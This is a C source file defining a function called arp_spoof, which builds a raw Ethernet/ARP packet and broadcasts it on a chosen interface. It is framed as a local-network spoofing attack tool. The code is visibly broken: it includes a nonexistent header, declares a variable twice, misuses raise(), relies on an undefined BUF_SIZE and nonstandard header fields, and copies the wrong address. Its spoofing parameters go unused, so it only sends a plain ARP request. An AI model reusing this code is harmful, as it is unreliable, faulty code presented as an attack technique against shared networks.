#include <arp.h>
#include <signal.h>
#include <netinet/if_ether.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <net/if.h>

int arp_spoof(char *interface,char* dev, char* sender_ip, char* target_ip){
    struct in_addr target_ip_hdr;
    int sock;
    struct ifreq ifr;

    if (inet_aton(target_ip,&target_ip_hdr) == 0){
        perror("inet_aton");
        raise(EXIT_FAILURE);
    }

    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));

    if (sock < 0){
        perror("socket");
        raise(EXIT_FAILURE);
    }
    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
        if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        exit(EXIT_FAILURE);
    }
      struct ethhdr eth_header;
    memcpy(eth_header.h_dest, "\xFF\xFF\xFF\xFF\xFF\xFF", ETH_ALEN); // Broadcast MAC address
    // memcpy(eth_header.h_source, ifr.ifr_hwaddr.sa_data, ETH_ALEN);     // Source MAC address
    eth_header.h_proto = htons(ETH_P_ARP);                              // Protocol type: ARP

    // Fill in ARP header
    struct arphdr arp_header;
    arp_header.ar_hrd = htons(ARPHRD_ETHER);       // Hardware type: Ethernet
    arp_header.ar_pro = htons(ETH_P_IP);           // Protocol type: IPv4
    arp_header.ar_hln = ETH_ALEN;                  // Hardware address length: 6 bytes
    arp_header.ar_pln = 4;                         // Protocol address length: 4 bytes
    arp_header.ar_op = htons(ARPOP_REQUEST);        // Operation code: ARP request
    memcpy(arp_header.ar_sip, &(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), 4); // Sender IP address
    memset(arp_header.ar_tha, 0, ETH_ALEN);         // Target hardware address: 0
    memcpy(arp_header.ar_tip, &target_ip, 4);       // Target IP address

    // Construct packet
    char packet[BUF_SIZE];
    memcpy(packet, &eth_header, sizeof(struct ethhdr));
    memcpy(packet + sizeof(struct ethhdr), &arp_header, sizeof(struct arphdr));

    // Send packet
    struct sockaddr addr;
    memset(&addr, 0, sizeof(struct sockaddr));
    strncpy(addr.sa_data, interface, sizeof(addr.sa_data));
    if (sendto(sock, packet, BUF_SIZE, 0, &addr, sizeof(struct sockaddr)) < 0) {
        perror("sendto");
        close(sock);
        exit(EXIT_FAILURE);
    }

    printf("ARP request sent to %s\n", target_ip);

    close(sock);
    return 0;
}